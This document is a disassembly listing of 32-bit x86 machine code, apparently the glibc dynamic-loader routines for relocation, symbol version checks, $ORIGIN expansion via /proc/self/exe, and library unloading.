mov eax, dword [esi + 0x204]
je 0x807ff28
cmp edx, eax
jne 0x807fca9
mov ecx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_5ch], ecx
mov dword [var_a0h], esi
jmp 0x807fd45
or edx, 2
jmp 0x807ff06
mov edx, 1
jmp 0x807fefb
mov edx, dword [var_70h]
mov ecx, dword [var_98h]
mov eax, dword [edx]
add dword [ecx], eax
jmp 0x807fd73
mov ebx, dword [var_10h_2]
mov eax, dword [esi + 0x74]
test ebx, ebx
mov ecx, dword [eax + 4]
jne 0x807ff5f
mov edx, dword [var_30h_2]
mov eax, dword [var_34h_2]
add eax, edx
cmp eax, ecx
je 0x807ff76
mov eax, dword [esi + 0x20]
mov dword [var_28h], ecx
mov ebx, dword [var_10h_2]
mov eax, dword [eax + 4]
mov dword [var_20h], ebx
mov dword [var_24h_2], eax
jmp 0x807ee86
mov eax, dword [esi + 0x20]
add edx, dword [eax + 4]
mov dword [var_30h_2], edx
jmp 0x807ee86
mov eax, dword [0x80aac20]
mov dword [edx + 8], 0x80811b0
mov edx, esi
call fcn.08081cd0
test eax, eax
je 0x807ffa1
mov dword [0x80aac60], esi
mov esi, dword [var_4h_3]
jmp 0x807ee43
movzx eax, word [esi + 0x14c]
mov ebx, dword [esi + 0x144]
shl eax, 5
lea eax, [eax + ebx]
cmp ebx, eax
jae 0x807edf9
cmp dword [ebx], 1
je 0x807ffe5
movzx eax, word [esi + 0x14c]
add ebx, 0x20
shl eax, 5
add eax, dword [esi + 0x144]
cmp ebx, eax
jb 0x807ffc4
jmp 0x807edf9
test byte [ebx + 0x18], 2
jne 0x807ffc9
mov ecx, dword [ebx + 8]
mov eax, dword [0x80aac74]
sub esp, 0x20
lea edi, [var_23h]
and edi, 0xfffffff0
mov edx, ecx
add edx, dword [ebx + 0x14]
lea edx, [eax + edx - 1]
neg eax
and ecx, eax
and edx, eax
sub edx, ecx
mov dword [edi + 4], edx
and eax, dword [ebx + 8]
add eax, dword [esi]
mov dword [edi], eax
mov dword [var_8h_4], 3
mov eax, dword [edi + 4]
mov dword [var_4h_5], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.080547a0
test eax, eax
js 0x808005c
mov ecx, dword [ebx + 0x18]
mov eax, 0x73516240
mov esi, dword [var_4h_3]
and ecx, 7
shl ecx, 2
sar eax, cl
mov ecx, dword [var_68h_2]
mov dword [var_68h_2], edi
and eax, 0xf
mov dword [edi + 8], eax
mov dword [edi + 0xc], ecx
jmp 0x807ffc9
mov ebx, str.cannot_make_segment_writable_for_relocation
jmp 0x807f227
mov eax, dword [arg_10h]
mov edx, str.__lazy_
test eax, eax
mov eax, 0x80a4f11
cmove edx, eax
mov dword [var_8h], edx
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x808008b
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h], eax
mov dword [esp], str._nrelocation_processing:__s_s_n
call fcn.08081c40
mov esi, dword [var_4h_3]
jmp 0x807edee
mov dword [var_sp_ch], str.elf_machine_rel_relative
mov dword [var_8h], 0x288
mov dword [var_4h], str..._sysdeps_i386_dl_machine.h
mov dword [esp], str.__reloc__r_info___0xff___8
call fcn.0805efc0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_bp_4h], ebx
mov edx, dword [eax + 0x22c]
mov ebx, eax
add edx, dword [eax]
mov eax, dword [0x80aac74]
dec eax
mov ecx, edx
not eax
add edx, dword [ebx + 0x230]
and ecx, eax
and edx, eax
cmp ecx, edx
je 0x8080115
sub edx, ecx
mov dword [var_8h_2], 1
mov dword [esp], ecx
mov dword [var_4h_2], edx
call fcn.080547a0
test eax, eax
js 0x808011a
mov ebx, dword [var_bp_4h]
leave
ret
call fcn.08048b20
xor ecx, ecx
mov dword [esp], 0x80a4400
mov edx, dword [ebx + 4]
mov eax, dword [eax]
call fcn.08081200
lea esi, [esi]
lea edi, [edi]
push ebp
shl ecx, 5
mov ebp, esp
add ecx, str.unexpected_reloc_type_0x
sub esp, 0x34
mov dword [var_ch_2], ebx
mov dword [var_bp_8h], esi
mov dword [var_4h_3], ecx
mov ebx, edx
lea esi, [var_2ch_2]
mov dword [ebp - 4], edi
mov dword [esp], esi
mov edi, eax
call fcn.080773c0
mov edx, ebx
xor ecx, ecx
and ebx, 0xf
shr edx, 4
and edx, 0xf
movzx edx, byte [edx + 0x80a0960]
mov byte [eax], dl
movzx edx, byte [ebx + 0x80a0960]
inc eax
mov byte [eax + 1], 0
mov byte [eax], dl
xor eax, eax
mov dword [esp], esi
mov edx, dword [edi + 4]
call fcn.08081200
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, 1
mov ebp, esp
sub esp, 0x18
mov dword [var_ch_3], ebx
mov dword [ebp - 8], esi
mov dword [ebp - 4], edi
mov ebx, dword [var_4h_3]
mov esi, 3
mov edi, 3
mov eax, dword [ebx + 8]
mov edx, dword [ebx + 0x10]
mov dword [var_8h_3], eax
mov eax, dword [ebx + 4]
mov dword [var_4h_4], eax
mov eax, dword [ebx]
movzx eax, byte [eax + 0x174]
and esi, eax
and edi, eax
mov eax, esi
test al, al
cmovne ecx, edi
mov dword [esp], ecx
mov eax, dword [ebx]
xor ecx, ecx
call fcn.0807cfa0
mov dword [ebx + 0x14], eax
sub esp, 0xc
mov edi, dword [ebp - 4]
mov ebx, dword [var_ch_3]
mov esi, dword [ebp - 8]
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x78
mov dword [var_6ch], 0
mov dword [var_5ch], 0
mov dword [var_50h], eax
mov dword [var_54h], edx
mov dword [var_58h], ecx
mov eax, dword [eax + 0x2c]
xor edx, edx
test eax, eax
je 0x80821fc
mov eax, dword [eax + 4]
mov ecx, dword [var_50h]
mov dword [var_60h], eax
mov ecx, dword [ecx + 0xa4]
mov eax, dword [var_50h]
mov eax, dword [eax + 0xac]
test ecx, ecx
mov dword [var_64h], ecx
mov dword [var_68h], eax
je 0x80821c2
mov edx, dword [ecx + 4]
mov ecx, dword [var_50h_2]
mov ecx, dword [ecx]
add edx, ecx
cmp word [edx], 1
mov dword [var_70h_2], edx
jne 0x8082385
lea esi, [esi]
mov edx, dword [var_70h]
mov ebx, dword [0x80aac58]
mov esi, dword [var_60h]
add esi, dword [edx + 4]
test ebx, ebx
je 0x8082129
mov edx, ebx
mov eax, esi
mov edi, ebx
call fcn.08081cd0
test eax, eax
jne 0x808213c
mov ebx, dword [ebx + 0xc]
test ebx, ebx
jne 0x8082113
mov ecx, dword [var_50h]
xor ebx, ebx
cmp ebx, dword [ecx + 0x154]
jb 0x808234c
xor edi, edi
test edi, edi
je 0x8082421
mov eax, dword [var_58h_2]
test eax, eax
jne 0x808233a
mov ebx, dword [var_70h_2]
add ebx, dword [ebx + 8]
mov edx, dword [var_50h_2]
mov ecx, dword [var_60h_2]
add ecx, dword [ebx + 8]
mov eax, dword [edx + 4]
cmp byte [eax], 0
je 0x808232e
mov esi, eax
movzx eax, word [ebx + 4]
mov dword [esp], edi
and eax, 2
mov dword [var_8h], eax
mov eax, dword [var_54h]
mov dword [var_4h], eax
mov eax, esi
mov edx, dword [ebx]
call fcn.08081d40
or dword [var_5ch], eax
sub esp, 0xc
movzx eax, word [ebx + 6]
and eax, 0x7fff
cmp eax, dword [var_6ch]
cmovbe eax, dword [var_6ch]
mov dword [var_6ch], eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x80821ae
add ebx, eax
jmp 0x8082155
mov edx, dword [var_70h]
mov eax, dword [edx + 0xc]
test eax, eax
je 0x80821c2
add edx, eax
mov dword [var_70h], edx
jmp 0x8082100
mov eax, dword [var_68h]
test eax, eax
je 0x80821f2
mov ecx, dword [var_68h_2]
mov eax, dword [var_50h_2]
mov edx, dword [ecx + 4]
add edx, dword [eax]
movzx eax, word [edx + 4]
and eax, 0x7fff
cmp eax, dword [var_6ch_2]
cmovbe eax, dword [var_6ch_2]
mov dword [var_6ch_2], eax
mov eax, dword [edx + 0x10]
test eax, eax
je 0x80821f2
add edx, eax
jmp 0x80821d4
mov edi, dword [var_6ch]
test edi, edi
jne 0x8082206
mov edx, dword [var_5ch_2]
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [var_6ch]
mov dword [var_4h], 0x10
inc ebx
mov dword [esp], ebx
call fcn.08051730
mov ecx, dword [var_50h]
test eax, eax
mov edx, eax
mov dword [ecx + 0x17c], eax
je 0x8082306
mov eax, dword [var_50h_2]
mov esi, dword [var_64h_2]
mov ecx, eax
mov dword [eax + 0x178], ebx
test esi, esi
mov eax, dword [eax + 0xdc]
mov eax, dword [eax + 4]
mov dword [ecx + 0x18c], eax
je 0x80822a8
mov eax, dword [var_64h_2]
mov esi, edx
mov edi, dword [eax + 4]
add edi, dword [ecx]
mov ebx, edi
add ebx, dword [edi + 8]
lea esi, [esi]
movzx edx, word [ebx + 6]
mov eax, dword [ebx]
mov ecx, edx
and edx, 0x8000
and ecx, 0x7fff
shl ecx, 4
mov dword [esi + ecx + 4], eax
mov dword [esi + ecx + 8], edx
mov eax, dword [var_60h_2]
add eax, dword [ebx + 8]
mov dword [esi + ecx], eax
mov eax, dword [var_60h_2]
add eax, dword [edi + 4]
mov dword [esi + ecx + 0xc], eax
mov eax, dword [ebx + 0xc]
test eax, eax
je 0x808229d
add ebx, eax
jmp 0x8082260
mov eax, dword [edi + 0xc]
test eax, eax
je 0x80822a8
add edi, eax
jmp 0x8082258
mov ebx, dword [var_68h_2]
test ebx, ebx
je 0x80821f9
mov edx, dword [var_68h_2]
mov ecx, dword [var_50h_2]
mov ebx, dword [edx + 4]
add ebx, dword [ecx]
mov esi, ebx
add esi, dword [ebx + 0xc]
test byte [ebx + 2], 1
jne 0x80822f7
movzx eax, word [ebx + 4]
mov edx, dword [var_50h_2]
mov ecx, dword [edx + 0x17c]
mov edx, dword [ebx + 8]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
mov dword [ecx + eax + 4], edx
mov dword [ecx + eax + 0xc], 0
mov edx, dword [var_60h_2]
add edx, dword [esi]
mov dword [ecx + eax], edx
mov eax, dword [ebx + 0x10]
test eax, eax
je 0x80821f9
add ebx, eax
jmp 0x80822be
mov ecx, str.cannot_allocate_version_reference_table
mov edi, 0xc
mov eax, dword [var_50h]
mov edx, dword [eax + 4]
cmp byte [edx], 0
jne 0x8082322
mov eax, dword [0x80a95a8]
mov edx, dword [eax]
mov dword [esp], ecx
mov eax, edi
xor ecx, ecx
call fcn.08081200
mov eax, dword [0x80a95a8]
mov esi, dword [eax]
jmp 0x808216c
test byte [edi + 0x175], 2
je 0x808214f
jmp 0x80821ae
mov edx, dword [var_50h]
mov eax, dword [edx + 0x150]
mov edx, dword [eax + ebx*4]
mov eax, esi
call fcn.08081cd0
test eax, eax
jne 0x8082374
mov ecx, dword [var_50h_2]
inc ebx
cmp ebx, dword [ecx + 0x154]
jb 0x808234c
jmp 0x808213a
mov edx, dword [var_50h]
mov eax, dword [edx + 0x150]
mov edi, dword [eax + ebx*4]
jmp 0x808213c
lea eax, [var_19h]
mov byte [var_19h], 0
mov dword [var_sp_10h], 0
mov dword [esp + 0xc], 0xa
mov dword [var_8h], eax
mov dword [var_4ch], str.unsupported_version_
movzx eax, word [edx]
mov esi, 1
xor ebx, ebx
mov dword [var_4h], 0
mov dword [esp], eax
call fcn.08063ca0
mov dword [var_34h], str._of_Verneed_record_n
mov edx, dword [var_4ch]
mov dword [var_48h], eax
mov dword [var_44h], str._of_Verneed_record_n
mov dword [var_38h], eax
mov dword [var_3ch], edx
mov eax, dword [ebp + ebx*4 - 0x3c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 2
jbe 0x80823db
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x3c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 2
mov edx, eax
jbe 0x8082402
mov ecx, esi
jmp 0x8082310
mov dword [var_sp_ch], str._dl_check_map_versions
mov dword [var_8h_2], 0xe5
mov dword [var_4h_2], str.dl_version.c
mov dword [esp], str.needed_____void__0_
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
mov ebx, eax
sub esp, 8
test eax, eax
mov dword [var_14h], ecx
mov dword [var_10h], edx
je 0x808247b
xor esi, esi
test byte [ebx + 0x175], 2
je 0x8082485
mov ebx, dword [ebx + 0xc]
or edi, esi
test ebx, ebx
jne 0x8082467
add esp, 8
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_14h]
mov edx, dword [var_10h]
mov eax, ebx
call fcn.08082090
test eax, eax
mov eax, 1
cmovne esi, eax
jmp 0x8082472
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [arg_8h]
mov esi, ebx
mov eax, dword [0x80a95f4]
inc ebx
mov dword [var_8h], str.ORIGIN
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
je 0x807af0d
inc edi
lea eax, [eax + ebx]
mov dword [var_4h], 0x24
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ebx, eax
jne 0x807aec0
add esp, 0x14
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_8h], str.PLATFORM
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
jne 0x807aee9
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_8h], 0x80a362c
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
je 0x807aeea
jmp 0x807aee9
push ebp
mov edx, 0x1000
mov ebp, esp
sub esp, 0x101c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
lea edi, [var_100ch]
mov ebx, str._proc_self_exe
mov ecx, edi
mov eax, 0x55
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8083340
test eax, eax
jle 0x8083340
movzx eax, byte [var_100ch]
cmp al, 0x5b
je 0x8083340
cmp al, 0x2f
jne 0x80833a0
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
je 0x80832f2
dec ebx
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
jne 0x80832e2
lea eax, [ebx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
cmp ebx, 1
je 0x808332d
lea eax, [ebx - 1]
mov dword [var_sp_4h], edi
mov dword [esp], esi
mov dword [var_sp_8h], eax
call fcn.08053740
mov byte [eax], 0
mov esi, esi
mov eax, esi
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
mov esi, dword [var_8h]
leave
ret
mov word [eax], 0x2f
jmp 0x8083320
mov esi, 0xffffffff
jmp 0x8083320
nop
lea esi, [esi]
mov eax, dword [0x80aac40]
mov esi, 0xffffffff
test eax, eax
je 0x8083320
mov dword [esp], eax
call fcn.08053400
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
mov eax, dword [0x80aac40]
mov dword [var_sp_8h], ebx
mov dword [esp], esi
mov dword [var_sp_4h], eax
call fcn.08053740
lea edx, [esi + 1]
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
jne 0x808331b
nop
lea esi, [esi]
dec eax
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
je 0x8083390
jmp 0x808331b
mov dword [var_sp_ch], str._dl_get_origin
mov dword [var_sp_8h], 0x30
mov dword [var_sp_4h], str..._sysdeps_unix_sysv_linux_dl_origin.c
mov dword [esp], str.linkval_0____
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0xc
mov eax, dword [eax]
mov edx, dword [0x80aac74]
mov esi, edx
neg esi
and esi, eax
cmp eax, dword [0x80aac00]
jne 0x80834d1
cmp byte [0x80aaa3c], 0
je 0x8083491
lea ebx, [edx*8]
add esi, edx
sub esi, ebx
mov dword [esp + 8], 7
mov dword [esp + 4], ebx
mov dword [esp], esi
call fcn.080547a0
test eax, eax
je 0x8083437
call fcn.08048b20
xor edx, edx
mov eax, dword [eax]
cmp eax, 0xd
je 0x8083487
cmp eax, 0xc
mov edx, eax
jne 0x8083487
cmp ebx, dword [0x80aac74]
je 0x8083478
mov eax, ebx
shr eax, 1
mov ebx, eax
add esi, eax
jmp 0x8083439
mov dword [edi], 0
or dword [0x80a95c8], 1
xor edx, edx
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp + 8], 0x1000007
mov dword [esp + 4], edx
mov dword [esp], esi
call fcn.080547a0
test eax, eax
je 0x8083478
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 0x16
je 0x80834bf
xor edx, edx
cmp eax, 0xd
cmovne edx, eax
jmp 0x8083487
mov edx, dword [0x80aac74]
mov byte [0x80aaa3c], 1
jmp 0x808342e
mov edx, 1
jmp 0x8083487
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov esi, dword [arg_10h]
mov ebx, dword [arg_ch]
mov dword [var_14h], esi
mov dword [var_10h], ebx
movzx eax, byte [ebx]
cmp al, 0x24
je 0x807afac
mov byte [esi], al
inc ebx
mov eax, dword [arg_14h]
inc esi
test eax, eax
je 0x807afa7
movzx eax, byte [ebx]
cmp al, 0x3a
je 0x807afa2
mov esi, esi
test al, al
jne 0x807af78
mov byte [esi], 0
mov eax, dword [arg_10h]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_14h], esi
jmp 0x807af90
movzx eax, byte [ebx]
jmp 0x807af90
mov eax, dword [0x80a95f4]
mov edx, dword [var_10h]
inc ebx
mov dword [var_8h], str.ORIGIN
mov dword [var_4h], ebx
mov dword [var_sp_10h], eax
mov dword [esp], edx
mov eax, dword [arg_14h]
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807b049
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x190]
test eax, eax
je 0x807affe
cmp eax, 0xffffffff
je 0x807affe
mov dword [esp], esi
mov dword [var_4h], eax
add ebx, edi
call fcn.080773c0
mov esi, eax
jmp 0x807afa7
cmp edi, 1
jbe 0x807b040
add ebx, edi
mov esi, dword [var_14h]
movzx eax, byte [ebx]
test al, al
je 0x807af94
mov ecx, dword [arg_14h]
test ecx, ecx
jne 0x807b032
inc ebx
movzx eax, byte [ebx]
test al, al
je 0x807af94
mov edx, dword [arg_14h]
test edx, edx
je 0x807b016
cmp al, 0x3a
jne 0x807b016
jmp 0x807af90
cmp al, 0x3a
jne 0x807b016
jmp 0x807af90
nop
lea esi, [esi]
mov byte [esi], 0x24
inc esi
jmp 0x807afa7
mov eax, dword [arg_14h]
mov edx, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_8h], str.PLATFORM
mov dword [var_4h], ebx
mov dword [var_ch], eax
mov dword [esp], edx
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807b07f
mov eax, dword [0x80aac34]
jmp 0x807afe3
mov eax, dword [arg_14h]
mov edx, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_8h], 0x80a362c
mov dword [var_4h], ebx
mov dword [var_ch], eax
mov dword [esp], edx
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807affe
mov eax, 0x8093da3
jmp 0x807afe3
push ebp
mov ebp, esp
sub esp, 0xf8
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_dch], eax
mov dword [var_e0h], edx
mov dword [var_e4h], ecx
mov dword [var_d4h], 0
call dword [0x80a9c20]
mov dword [var_e8h], eax
mov eax, dword [eax]
mov dword [var_1ch], eax
lea eax, [var_d0h]
mov dword [esp], eax
call fcn.08084a40
test eax, eax
mov edx, eax
jne 0x80814af
mov ecx, dword [var_e8h]
lea eax, [var_d8h]
mov dword [ecx], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [var_e4h]
mov eax, dword [var_1ch]
mov edx, dword [var_e8h]
mov ecx, dword [var_dch]
mov dword [edx], eax
mov eax, dword [var_e0h]
mov dword [ecx], 0
mov dword [eax], 0
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret 4
mov eax, dword [var_1ch]
mov ecx, dword [var_e8h]
mov dword [ecx], eax
mov ecx, dword [var_dch]
mov eax, dword [var_d8h]
mov dword [ecx], eax
mov ecx, dword [var_e0h]
mov eax, dword [var_d4h]
mov dword [ecx], eax
xor eax, eax
cmp edx, 0xffffffff
cmovne eax, edx
jmp 0x80814a2
xor eax, eax
mov edx, dword [arg_4h]
mov dword [edx], ebx
mov dword [edx + 4], esi
mov dword [edx + 8], edi
lea ecx, [arg_4h]
mov dword [edx + 0x10], ecx
mov ecx, dword [esp]
mov dword [edx + 0x14], ecx
mov dword [edx + 0xc], ebp
mov dword [edx + 0x18], eax
ret
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [0x80aaa00]
test edx, edx
je 0x807dea0
cmp edx, 0xffffffff
je 0x807dea0
mov eax, dword [0x80aaa08]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08054780
mov dword [0x80aaa00], 0
leave
ret
push ebp
mov edx, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x6c
test byte [eax + 0x1ec], 8
mov byte [var_21h], 0
mov dword [var_20h], 0
mov dword [var_14h], eax
jne 0x8055fa4
mov eax, dword [edx + 0x170]
test eax, eax
je 0x8055fb6
mov eax, 0
test eax, eax
je 0x80557d9
mov dword [esp], 0x80a95d4
call section.
mov edx, dword [var_14h_2]
mov ecx, dword [edx + 0x170]
cmp ecx, 1
ja 0x80557f5
movzx eax, byte [edx + 0x174]
and eax, 3
cmp al, 2
je 0x8055840
test byte [0x80aac10], 0x40
jne 0x8055821
dec dword [edx + 0x170]
mov eax, 0
test eax, eax
je 0x8055819
mov dword [esp], 0x80a95d4
call section.
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_8h], ecx
mov eax, dword [edx + 4]
mov dword [esp], str._nclosing_file_s__opencount___u_n
mov dword [var_4h], eax
call fcn.08081c40
mov edx, dword [var_14h_2]
jmp 0x80557fe
lea esi, [esi]
mov esi, dword [edx + 0x154]
mov ecx, dword [edx + 0x1d8]
test esi, esi
mov dword [var_10h], ecx
je 0x8055f87
mov ecx, dword [var_10h]
lea eax, [esi*4 + 0xf]
mov dword [var_1ch], esi
mov edx, ecx
and eax, 0xfffffff0
xor esi, esi
sub esp, eax
mov eax, dword [ecx]
lea ebx, [var_sp_10h]
mov dword [var_18h], ebx
test eax, eax
je 0x8055f7f
mov esi, esi
mov eax, dword [edx + esi*4]
mov dword [eax + 0x1f4], esi
mov eax, dword [eax + 0x170]
mov dword [ebx + esi*4], eax
inc esi
mov edi, dword [edx + esi*4]
test edi, edi
jne 0x8055880
mov eax, dword [ecx + 4]
dec dword [ebx]
mov esi, 1
test eax, eax
je 0x80558c8
test byte [eax + 0x1ec], 8
jne 0x80558c0
mov eax, dword [ebx + esi*4]
dec eax
test eax, eax
mov dword [ebx + esi*4], eax
je 0x8055f66
inc esi
mov eax, dword [ecx + esi*4]
test eax, eax
jne 0x80558a8
mov esi, dword [ebx]
test esi, esi
jne 0x8055f42
mov edx, dword [ecx]
xor esi, esi
mov eax, ecx
test edx, edx
je 0x805594a
mov dword [var_54h], 0
mov edx, dword [var_54h]
mov edi, dword [eax + edx]
mov eax, dword [ebx + edx]
test eax, eax
jne 0x8055f36
movzx edx, byte [edi + 0x174]
mov eax, edx
and eax, 3
cmp al, 2
je 0x8055e33
mov eax, dword [var_54h]
mov ecx, dword [ebx + eax]
test ecx, ecx
je 0x8055920
mov eax, edx
and eax, 3
cmp al, 2
je 0x8055d6e
nop
mov ecx, dword [var_54h]
and edx, 3
cmp dl, 2
mov eax, dword [ebx + ecx]
mov dword [edi + 0x170], eax
jne 0x8055d42
add dword [var_54h], 4
mov eax, dword [var_10h]
inc esi
mov edx, dword [var_54h]
mov ecx, dword [eax + edx]
test ecx, ecx
jne 0x80558e3
mov dword [0x80aad3c], 2
xor esi, esi
call fcn.080817b0
mov ecx, dword [var_10h]
mov dword [var_38h], 0
mov dword [var_34h], 0
mov edx, dword [ecx]
mov eax, ecx
test edx, edx
je 0x80559c7
mov edi, dword [eax + esi*4]
mov eax, dword [edi + 0x170]
test eax, eax
jne 0x8055995
movzx edx, byte [edi + 0x174]
mov eax, edx
and eax, 3
cmp al, 2
je 0x8055a5b
inc esi
mov eax, ecx
mov ebx, dword [ecx + esi*4]
test ebx, ebx
jne 0x8055974
cmp byte [var_21h_2], 0
je 0x80559c7
mov eax, dword [0x80aabe4]
inc eax
test eax, eax
mov dword [0x80aabe4], eax
je 0x8055fc9
mov edx, dword [var_38h]
cmp edx, dword [0x80aabd0]
je 0x8055a4d
mov dword [0x80aad3c], 0
call fcn.080817b0
mov ecx, dword [var_20h_2]
test ecx, ecx
jne 0x80559ed
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051180
jmp 0x8055804
mov eax, dword [var_20h_2]
mov ecx, dword [var_20h_2]
mov edx, dword [eax + 4]
lea eax, [edx - 1]
test edx, edx
mov dword [ecx + 4], eax
je 0x8055a1f
mov eax, dword [var_20h_2]
mov edx, dword [eax + 4]
cmp edx, dword [eax + 8]
jae 0x8055a12
cmp byte [eax + edx + 0x10], 0
je 0x8055a3b
mov ecx, dword [var_20h_2]
lea eax, [edx - 1]
test edx, edx
mov dword [ecx + 4], eax
jne 0x8055a00
mov edx, dword [var_20h_2]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051180
mov ecx, dword [var_20h_2]
mov ecx, dword [ecx + 0xc]
test ecx, ecx
mov dword [var_20h_2], ecx
je 0x80559dd
jmp 0x80559ed
mov eax, dword [eax]
mov eax, dword [eax + edx*4]
call fcn.08055790
mov eax, dword [var_20h_2]
mov edx, dword [eax + 4]
jmp 0x8055a12
mov ecx, dword [var_34h]
mov dword [0x80aabd0], ecx
jmp 0x80559c7
and edx, 0x10
jne 0x8055cf4
mov eax, dword [edi + 0x218]
test eax, eax
jne 0x8055c33
mov eax, dword [edi + 0x198]
sub eax, dword [edi + 0x194]
mov dword [var_4h], eax
mov eax, dword [edi + 0x194]
mov dword [esp], eax
call fcn.08054780
mov edx, dword [edi + 0x10]
test edx, edx
je 0x8055c26
mov eax, dword [edi + 0xc]
mov dword [edx + 0xc], eax
mov edx, dword [edi + 0xc]
dec dword [0x80aabf8]
test edx, edx
je 0x8055ab4
mov eax, dword [edi + 0x10]
mov dword [edx + 0x10], eax
mov eax, dword [edi + 0x17c]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [edi + 0x190]
cmp eax, 0xffffffff
je 0x8055ad5
mov dword [esp], eax
call fcn.08051180
mov ecx, dword [edi + 0x1e4]
test ecx, ecx
jne 0x8055b8d
mov eax, dword [edi + 4]
mov dword [esp], eax
call fcn.08051180
mov ebx, dword [edi + 0x14]
mov eax, ebx
mov ebx, dword [ebx + 4]
mov edx, dword [eax + 8]
test edx, edx
je 0x8055b80
test ebx, ebx
jne 0x8055af1
cmp edi, dword [var_14h_2]
je 0x8055b18
mov eax, dword [edi + 0x1d8]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [edi + 0x1b4]
lea eax, [edi + 0x1a0]
cmp edx, eax
je 0x8055b30
mov dword [esp], edx
call fcn.08051180
test byte [edi + 0x174], 0x80
jne 0x8055b6f
mov eax, dword [edi + 0x180]
cmp eax, 0xffffffff
je 0x8055b4c
mov dword [esp], eax
call fcn.08051180
mov eax, dword [edi + 0x1d0]
cmp eax, 0xffffffff
je 0x8055b5f
mov dword [esp], eax
call fcn.08051180
mov dword [esp], edi
call fcn.08051180
mov ecx, dword [var_10h]
jmp 0x8055995
mov eax, dword [edi + 0x144]
mov dword [esp], eax
call fcn.08051180
jmp 0x8055b39
nop
mov dword [esp], eax
call fcn.08051180
jmp 0x8055b01
mov eax, dword [edi + 0x1e0]
xor ebx, ebx
lea edx, [eax + 0x1f]
and edx, 0xfffffff0
sub esp, edx
mov dword [var_sp_14h], eax
mov dword [var_sp_10h], ecx
lea edx, [var_sp_10h]
mov eax, dword [edi + 0x1e0]
mov ecx, dword [var_20h_2]
mov dword [var_40h], edx
mov dword [var_sp_18h], eax
mov dword [var_sp_1ch], ecx
mov eax, dword [edi + 0x1e0]
cmp ebx, eax
mov dword [var_4ch], eax
jae 0x8055c11
mov edx, dword [var_1ch]
mov ecx, dword [var_10h]
